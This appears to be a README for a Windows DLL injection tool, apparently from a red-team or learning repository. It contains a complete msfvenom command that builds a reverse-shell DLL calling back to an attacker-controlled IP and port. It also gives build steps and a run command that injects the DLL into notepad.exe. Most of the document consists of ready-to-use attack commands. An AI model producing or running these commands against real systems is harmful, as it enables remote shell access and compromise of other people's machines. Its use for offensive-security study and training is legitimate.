# DLL Injection
The code is largely the same as the shell injection, we open a process, write our injection and create a thread.
The key difference is that we use a malicious DLL file instead of a shellcode.

We craft our malicious dll in msfvenom and move it to our target
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<listen_port> -f dll -o inject.dll
```

## Use
Launch the x64 Native Tools Command Prompt for VS console and navigate to the directory. The Makefile is made with cl in mind. you could change it to use gcc if you rather install that instead.

In the root directory run `make` (you have to install it someway in your windows machine) and the binary will be created in the bin folder.
```cmd
make
```

Then you can execeute it from which ever terminal you wish
```cmd
bin/shellcode.exe notepad.exe
```
